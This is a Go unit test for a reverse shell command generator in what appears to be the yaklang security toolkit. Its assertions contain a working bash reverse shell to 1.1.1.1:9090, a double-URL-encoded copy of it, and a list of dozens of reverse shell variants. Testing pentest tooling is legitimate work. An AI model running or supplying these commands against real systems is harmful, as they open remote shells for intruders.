package yakgrpc

import (
	"context"
	"github.com/stretchr/testify/assert"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"strings"
	"testing"
)

func TestServer_GenerateReverseShellCommand(t *testing.T) {
	client, err := NewLocalClient()
	if err != nil {
		t.Fatal(err)
	}
	res, err := client.GenerateReverseShellCommand(context.Background(), &ypb.GenerateReverseShellCommandRequest{
		System:    "Linux",
		CmdType:   "ReverseShell",
		Program:   "Bash -i",
		ShellType: "/bin/sh",
		Encode:    "None",
		IP:        "1.1.1.1",
		Port:      9090,
	})
	if err != nil {
		t.Fatal(err)
	}
	assert.Equal(t, "/bin/sh -i >& /dev/tcp/1.1.1.1/9090 0>&1", res.GetResult())
	res, err = client.GenerateReverseShellCommand(context.Background(), &ypb.GenerateReverseShellCommandRequest{
		System:    "Linux",
		CmdType:   "ReverseShell",
		Program:   "Bash -i",
		ShellType: "/bin/sh",
		Encode:    "DoubleUrl",
		IP:        "1.1.1.1",
		Port:      9090,
	})
	if err != nil {
		t.Fatal(err)
	}
	assert.Equal(t, "%252f%2562%2569%256e%252f%2573%2568%2520%252d%2569%2520%253e%2526%2520%252f%2564%2565%2576%252f%2574%2563%2570%252f%2531%252e%2531%252e%2531%252e%2531%252f%2539%2530%2539%2530%2520%2530%253e%2526%2531", res.GetResult())
	programListRes, err := client.GetReverseShellProgramList(context.Background(), &ypb.GetReverseShellProgramListRequest{
		System:  "Linux",
		CmdType: "ReverseShell",
	})
	if err != nil {
		t.Fatal(err)
	}
	assert.Equal(t, "Bash -i,Bash 196,Bash read line,Bash 5,Bash udp,nc mkfifo,nc -e,BusyBox nc -e,nc -c,ncat -e,ncat udp,curl,rustcat,C,C# TCP Client,C# Bash -i,Haskell #1,Perl,Perl no sh,Perl PentestMonkey,PHP PentestMonkey,PHP Ivan Sincek,PHP cmd,PHP cmd 2,PHP cmd small,PHP exec,PHP shell_exec,PHP system,PHP passthru,PHP `,PHP popen,PHP proc_open,Python #1,Python #2,Python3 #1,Python3 #2,Python3 shortest,Ruby #1,Ruby no sh,socat #1,socat #2 (TTY),sqlite3 nc mkfifo,node.js,node.js #2,Java #1,Java #2,Java #3,Java Web,Java Two Way,Javascript,telnet,zsh,Lua #1,Lua #2,Golang,Vlang,Awk,Dart,Crystal (system),Crystal (code)", strings.Join(programListRes.GetProgramList(), ","))
	assert.Equal(t, "sh,/bin/sh,bash,/bin/bash,cmd,powershell,pwsh,ash,bsh,csh,ksh,zsh,pdksh,tcsh,mksh,dash", strings.Join(programListRes.GetShellList(), ","))
}
